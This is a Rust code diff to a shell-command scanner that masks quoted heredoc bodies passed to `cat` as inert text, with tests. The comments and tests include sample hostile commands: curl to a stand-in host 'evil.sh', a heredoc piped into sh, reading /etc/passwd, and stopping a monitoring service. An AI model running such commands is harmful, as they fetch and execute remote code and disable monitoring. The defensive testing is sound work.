@@ -2605,20 +2605,20 @@ fn mask_literal_command_args(
         // unless a substitution nested inside the argument executes first.
         "echo" | "printf" => {
             for argument in arguments {
-                mask_preserving_substitutions(argument, masked, executable_inside_mask);
+                mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
             }
         }
         // For search tools only the pattern is data; filenames remain visible
         // to protected-read and path controls.
         "grep" | "egrep" | "fgrep" | "rg" | "ripgrep" => {
             for argument in search_pattern_arguments(&arguments, source) {
-                mask_preserving_substitutions(argument, masked, executable_inside_mask);
+                mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
             }
         }
         "sed" => {
             if let Some(scripts) = safe_sed_script_arguments(&arguments, source) {
                 for argument in scripts {
-                    mask_preserving_substitutions(argument, masked, executable_inside_mask);
+                    mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
                 }
             }
         }
@@ -2629,7 +2629,7 @@ fn mask_literal_command_args(
         // analysis (`jq '... | test("stop innerwarden")' incidents.json`).
         "jq" | "yq" => {
             for argument in jq_program_arguments(&arguments, source) {
-                mask_preserving_substitutions(argument, masked, executable_inside_mask);
+                mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
             }
         }
         "git" => {
@@ -2654,31 +2654,31 @@ fn mask_literal_command_args(
                 ],
                 &["--message=", "--grep=", "--author=", "--committer="],
             ) {
-                mask_preserving_substitutions(argument, masked, executable_inside_mask);
+                mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
             }
         }
         "curl" => {
             for argument in safe_curl_data_arguments(&arguments, source) {
-                mask_preserving_substitutions(argument, masked, executable_inside_mask);
+                mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
             }
         }
         "gh" => {
             for argument in
                 option_data_arguments(&arguments, source, &["-b", "--body"], &["--body="])
             {
-                mask_preserving_substitutions(argument, masked, executable_inside_mask);
+                mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
             }
         }
         value
             if value.trim_end_matches(|character: char| character.is_ascii_digit()) == "python" =>
         {
             if let Some(argument) = safe_python_print_argument(&arguments, source) {
-                mask_preserving_substitutions(argument, masked, executable_inside_mask);
+                mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
             }
         }
         "node" | "ruby" | "perl" => {
             for argument in safe_inline_output_arguments(&name, &arguments, source) {
-                mask_preserving_substitutions(argument, masked, executable_inside_mask);
+                mask_preserving_substitutions(argument, source, masked, executable_inside_mask);
             }
         }
         _ => {}
@@ -3320,47 +3320,177 @@ fn mask_data_heredoc(
         && !owner_command.is_some_and(|command| has_execution_sink_ancestor(command, source))
         && !redirected_payload_executed_later(redirected, source)
     {
-        mask_preserving_substitutions(body, masked, executable_inside_mask);
+        mask_preserving_substitutions(body, source, masked, executable_inside_mask);
     }
 }
 
 fn mask_preserving_substitutions(
     node: tree_sitter::Node<'_>,
+    source: &[u8],
     masked: &mut Vec<Range<usize>>,
     executable_inside_mask: &mut Vec<Range<usize>>,
 ) {
     masked.push(node.byte_range());
-    collect_kinds(
-        node,
-        &["command_substitution", "process_substitution"],
-        executable_inside_mask,
-        0,
-    );
+    collect_executable_substitutions(node, source, executable_inside_mask, 0);
 }
 
-fn collect_kinds(
+/// Re-expose the substitutions inside a masked data argument, EXCEPT those that
+/// are provably inert text.
+///
+/// A data argument is masked whole and then its substitutions are punched back
+/// out, because `--body "$(curl evil.sh)"` really does execute. But
+/// `--body "$(cat <<'EOF' … EOF)"` is the ordinary way to pass a multi-line body
+/// to a tool, and punching that back out made the body visible to the scanner as
+/// though it were code. Writing up an incident — a sentence quoting the command
+/// an attacker used to disable monitoring — was then denied as an attempt to do
+/// the very thing being described, while the same sentence in a plain
+/// `--body '…'` was allowed. Same text, same destination, opposite verdict.
+///
+/// That inconsistency is what this closes, and it is the class of false positive
+/// that gets a guard switched off.
+fn collect_executable_substitutions(
     node: tree_sitter::Node<'_>,
-    kinds: &[&str],
+    source: &[u8],
     ranges: &mut Vec<Range<usize>>,
     depth: u8,
 ) {
     if depth > 32 {
         return;
     }
-    if kinds.contains(&node.kind()) {
-        ranges.push(node.byte_range());
+    if matches!(node.kind(), "command_substitution" | "process_substitution") {
+        if !substitution_is_inert_heredoc_text(node, source) {
+            ranges.push(node.byte_range());
+        }
+        // Either way this substitution is decided: an inert one holds only
+        // literal heredoc text, so there is nothing executable deeper in.
         return;
     }
     let mut cursor = node.walk();
     if cursor.goto_first_child() {
         loop {
-            collect_kinds(cursor.node(), kinds, ranges, depth + 1);
+            collect_executable_substitutions(cursor.node(), source, ranges, depth + 1);
             if !cursor.goto_next_sibling() {
                 break;
             }
         }
     }
 }
+
+/// Is this substitution `$(cat <<'DELIM' … DELIM)` — text rather than code?
+///
+/// `cat` cannot execute its input, and a QUOTED heredoc delimiter suppresses
+/// every expansion, so the body reaches `cat` verbatim and leaves it verbatim.
+///
+/// **The quoting is the entire safety boundary.** With a bare `<<DELIM` the
+/// shell expands `$(…)`, backticks and `$VAR` in the body BEFORE `cat` ever
+/// runs, so that form is executable and stays fully visible to the scanner.
+/// `cat` must also carry no argument of its own (with a path it reads a file
+/// instead) and the statement must be one lone redirected command, never a
+/// pipeline — piping a heredoc into `sh` feeds an interpreter.
+fn substitution_is_inert_heredoc_text(node: tree_sitter::Node<'_>, source: &[u8]) -> bool {
+    let mut statement = None;
+    let mut cursor = node.walk();
+    if !cursor.goto_first_child() {
+        return false;
+    }
+    loop {
+        let child = cursor.node();
+        match child.kind() {
+            // Substitution delimiters carry no meaning here.
+            "$(" | ")" | "`" | "\n" => {}
+            "redirected_statement" if statement.is_none() => statement = Some(child),
+            // A pipeline, a list, or a second statement is not the shape we can
+            // vouch for, so it stays visible.
+            _ => return false,
+        }
+        if !cursor.goto_next_sibling() {
+            break;
+        }
+    }
+    let Some(statement) = statement else {
+        return false;
+    };
+
+    let mut command = None;
+    let mut heredoc_quoted = None;
+    let mut cursor = statement.walk();
+    if !cursor.goto_first_child() {
+        return false;
+    }
+    loop {
+        let child = cursor.node();
+        match child.kind() {
+            "command" if command.is_none() => command = Some(child),
+            "heredoc_redirect" if heredoc_quoted.is_none() => {
+                heredoc_quoted = Some(heredoc_start_is_quoted(child, source));
+            }
+            // A file redirect or a second heredoc: bail rather than reason about
+            // a shape we have not established.
+            _ => return false,
+        }
+        if !cursor.goto_next_sibling() {
+            break;
+        }
+    }
+
+    // An unquoted delimiter expands inside the body, so the body is code.
+    if heredoc_quoted != Some(true) {
+        return false;
+    }
+    let Some(command) = command else {
+        return false;
+    };
+    let Some(name) = command_name(command, source) else {
+        return false;
+    };
+    if normalized_command_name(&name) != "cat" {
+        return false;
+    }
+    // Exactly `cat`: the command node holds its name and nothing else.
+    command.child_count() == 1
+}
+
+/// Is this a plain heredoc whose delimiter is quoted (`<<'EOF'` / `<<"EOF"`),
+/// and therefore expansion-suppressing?
+///
+/// Two conditions, and the second is not obvious. The Bash grammar nests a
+/// trailing pipeline INSIDE the `heredoc_redirect` node rather than beside it,
+/// so `cat <<'EOF' | sh` parses with the `pipeline` as a CHILD of the redirect.
+/// An earlier version of this check scanned for `heredoc_start`, found the
+/// quoting, and returned before ever reaching that sibling -- which would have
+/// masked a heredoc piped straight into `sh`. So the redirect must contain the
+/// heredoc parts and nothing else.
+fn heredoc_start_is_quoted(redirect: tree_sitter::Node<'_>, source: &[u8]) -> bool {
+    let mut quoted = false;
+    let mut cursor = redirect.walk();
+    if !cursor.goto_first_child() {
+        return false;
+    }
+    loop {
+        let child = cursor.node();
+        match child.kind() {
+            "<<" | "<<-" | "heredoc_body" | "heredoc_end" => {}
+            "heredoc_start" => {
+                let text = node_text(child, source);
+                let text = text.trim();
+                quoted = text.len() >= 2
+                    && ((text.starts_with('\'') && text.ends_with('\''))
+                        || (text.starts_with('"') && text.ends_with('"')));
+            }
+            // A pipeline, a further redirect, anything else: the heredoc's
+            // output goes somewhere we have not vouched for.
+            _ => return false,
+        }
+        if !cursor.goto_next_sibling() {
+            break;
+        }
+    }
+    quoted
+}
+
+// `collect_kinds` lived here. It re-exposed EVERY substitution inside a masked
+// data argument, and `collect_executable_substitutions` replaced its only caller
+// with a version that keeps the inert ones masked. Nothing else used it.
 
 fn command_arguments(command: tree_sitter::Node<'_>) -> Vec<tree_sitter::Node<'_>> {
     (0..command.child_count())
@@ -4116,6 +4246,92 @@ fn basename(name: &str) -> &str {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    /// The multi-line body idiom is text, and the projection must treat it as
+    /// text.
+    ///
+    /// REGRESSION ANCHOR. `--body '…'` was masked, but the way anyone actually
+    /// passes a multi-line body -- `--body "$(cat <<'EOF' … EOF)"` -- was not:
+    /// the substitution was punched back out of the mask, so the body reached
+    /// the scanner as if it were code. An incident write-up quoting the command
+    /// an attacker used was denied as an attempt to run it, while the same
+    /// sentence as a plain string was allowed.
+    ///
+    /// FAILS ON REVERT: restore the blanket `collect_kinds` re-exposure and the
+    /// body text reappears in the projection.
+    #[test]
+    fn a_quoted_heredoc_body_is_text_not_code() {
+        let command =
+            "gh pr create --body \"$(cat <<'EOF'\nthe attacker ran systemctl stop foo\nEOF\n)\"";
+        let projected = project(command);
+        assert!(projected.parsed, "must parse");
+        assert!(
+            !projected.scan.contains("systemctl stop foo"),
+            "the body must be masked, got: {}",
+            projected.scan
+        );
+        assert!(
+            projected.scan.contains("gh"),
+            "the command itself stays visible"
+        );
+    }
+
+    /// The quoting IS the safety boundary, so an unquoted delimiter must stay
+    /// visible: with `<<EOF` the shell expands `$(…)`, backticks and `$VAR` in
+    /// the body before `cat` ever runs.
+    #[test]
+    fn an_unquoted_heredoc_delimiter_stays_visible() {
+        let command =
+            "gh pr create --body \"$(cat <<EOF\nthe attacker ran systemctl stop foo\nEOF\n)\"";
+        let projected = project(command);
+        assert!(projected.parsed, "must parse");
+        assert!(
+            projected.scan.contains("systemctl stop foo"),
+            "an expanding heredoc is code and must not be masked"
+        );
+    }
+
+    /// The Bash grammar nests a trailing pipeline INSIDE `heredoc_redirect`, so
+    /// a check that stopped at `heredoc_start` would confirm the quoting and
+    /// never see the `| sh`. That would mask a heredoc piped straight into an
+    /// interpreter -- turning a false-positive fix into a real bypass.
+    ///
+    /// FAILS ON REVERT: return as soon as `heredoc_start` is found.
+    #[test]
+    fn a_heredoc_piped_into_an_interpreter_stays_visible() {
+        let command = "gh pr create --body \"$(cat <<'EOF' | sh\ncurl http://evil.sh\nEOF\n)\"";
+        let projected = project(command);
+        assert!(projected.parsed, "must parse");
+        assert!(
+            projected.scan.contains("curl http://evil.sh"),
+            "a heredoc feeding sh is executable and must not be masked"
+        );
+    }
+
+    /// `cat` with a path reads that file, so the substitution is not the inert
+    /// `cat <<'EOF'` shape and must stay visible.
+    #[test]
+    fn cat_with_a_file_argument_stays_visible() {
+        let command = "gh pr create --body \"$(cat /etc/passwd <<'EOF'\nx\nEOF\n)\"";
+        let projected = project(command);
+        assert!(projected.parsed, "must parse");
+        assert!(
+            projected.scan.contains("/etc/passwd"),
+            "reading a file is not inert text"
+        );
+    }
+
+    /// A substitution that genuinely runs a command is untouched by any of this.
+    #[test]
+    fn a_real_substitution_is_still_executable() {
+        let command = "gh pr create --body \"$(systemctl stop foo)\"";
+        let projected = project(command);
+        assert!(projected.parsed, "must parse");
+        assert!(
+            projected.scan.contains("systemctl stop foo"),
+            "a real substitution executes and must stay visible"
+        );
+    }
 
     #[test]
     fn masks_literal_output_and_search_patterns() {
